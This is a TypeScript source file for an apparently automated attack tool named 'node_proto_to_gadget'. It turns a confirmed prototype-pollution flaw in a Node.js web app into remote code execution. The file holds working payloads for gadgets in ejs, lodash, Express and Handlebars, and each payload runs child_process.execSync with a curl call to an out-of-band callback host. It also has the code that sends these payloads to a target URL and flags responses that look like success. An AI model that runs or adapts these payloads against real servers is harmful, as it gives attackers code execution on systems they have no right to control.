// T45 — node_proto_to_gadget
// Extends prototype-pollution detection to gadget execution.
// Pollute __proto__ then trigger via known sinks (ejs, lodash, express, handlebars).

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'node_proto_to_gadget',
  description:
    'Extends prototype-pollution detection to actual RCE via gadget execution. ' +
    'Pollutes __proto__ with known sink properties (ejs outputFunctionName, lodash template, ' +
    'express view engine) and observes if the next render/template call executes injected code. ' +
    'Run after prototype_pollution_probe confirms the pollution vector.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',        type: 'string', required: true,  description: 'Target URL (endpoint that accepts JSON/query params)' },
    { name: 'method',     type: 'string', required: false, description: 'HTTP method', default: 'POST' },
    { name: 'field',      type: 'string', required: false, description: 'Pollution vector field', default: '__proto__' },
    { name: 'sink',       type: 'string', required: false, description: 'Gadget sink: auto|ejs|lodash|express|handlebars', default: 'auto' },
    { name: 'oob_host',   type: 'string', required: true,  description: 'OOB callback host for RCE confirmation' },
    { name: 'headers',    type: 'string', required: false, description: 'JSON extra headers' },
    { name: 'timeout_ms', type: 'number', required: false, description: 'Per-request timeout ms', default: 15000 },
  ],
};

const GADGETS = {
  ejs: (oobHost: string) => ({
    name: 'ejs_outputFunctionName',
    payload: { '__proto__': { 'outputFunctionName': `_; require('child_process').execSync('curl ${oobHost}/ejs-rce'); //` } },
    trigger_path: '/',
    note: 'EJS template engine: pollute outputFunctionName → arbitrary code on next render',
  }),
  lodash: (oobHost: string) => ({
    name: 'lodash_template',
    payload: { '__proto__': { 'sourceURL': `  ;require('child_process').execSync('curl ${oobHost}/lodash-rce');//` } },
    trigger_path: '/',
    note: 'Lodash _.template: pollute sourceURL → arbitrary code in template compilation',
  }),
  express: (oobHost: string) => ({
    name: 'express_view_engine',
    payload: { '__proto__': { 'view options': { 'outputFunctionName': `_; require('child_process').execSync('curl ${oobHost}/express-rce'); //` } } },
    trigger_path: '/',
    note: 'Express.js view engine: pollute view options → arbitrary code in template render',
  }),
  handlebars: (oobHost: string) => ({
    name: 'handlebars_lookup',
    payload: { '__proto__': { 'lookup': '()=>{}', 'type': 'Program', 'body': [{'type': 'MustacheStatement', 'path': {'original': `require('child_process').execSync('curl ${oobHost}/hbs-rce')`}}] } },
    trigger_path: '/',
    note: 'Handlebars AST injection via prototype pollution',
  }),
};

export const nodeProtoToGadgetTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const method = String(params.method || 'POST').toUpperCase();
    const sinkHint = String(params.sink || 'auto');
    const oobHost = String(params.oob_host || '');
    const timeoutMs = Number(params.timeout_ms || 15000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };
    if (!oobHost) return { output: 'oob_host required', parsed: { error: 'missing_oob_host' } };

    let headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0', 'Content-Type': 'application/json' };
    try { if (params.headers) Object.assign(headers, JSON.parse(String(params.headers))); } catch { /* ignore */ }

    const sinksToTest = sinkHint === 'auto'
      ? Object.keys(GADGETS) as Array<keyof typeof GADGETS>
      : [sinkHint as keyof typeof GADGETS].filter(s => s in GADGETS);

    const results: Array<{ name: string; status: number; interesting: boolean; note: string; error?: string }> = [];

    for (const sinkKey of sinksToTest) {
      const gadget = GADGETS[sinkKey](oobHost);
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        const resp = await fetch(url, { method, headers, body: JSON.stringify(gadget.payload), signal: controller.signal });
        clearTimeout(timer);
        const text = await resp.text();
        const interesting = resp.status >= 500 || /rce|exec|system|require|child_process/i.test(text);
        results.push({ name: gadget.name, status: resp.status, interesting, note: gadget.note });
      } catch (err) {
        results.push({ name: gadget.name, status: 0, interesting: false, note: gadget.note, error: String(err) });
      }
    }

    const interesting = results.filter(r => r.interesting);
    const lines = [
      `node_proto_to_gadget — ${url.substring(0, 80)}`,
      `Gadget sinks tested: ${sinksToTest.join(', ')}`,
      `Interesting responses: ${interesting.length}/${results.length}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.interesting ? '⚡ INTERESTING' : (r.error ? '✗ ERR        ' : '  ·          ');
      lines.push(`  ${flag}  [${r.name.padEnd(28)}]  status=${r.status}`);
      lines.push(`          ${r.note}`);
    }
    lines.push('');
    lines.push(`MONITOR OOB: call oob_check(action=check, token=...) to verify ${oobHost} received callback`);

    return {
      output: lines.join('\n'),
      parsed: { sinks_tested: sinksToTest, probe_results: results, interesting_count: interesting.length },
    };
  },
};
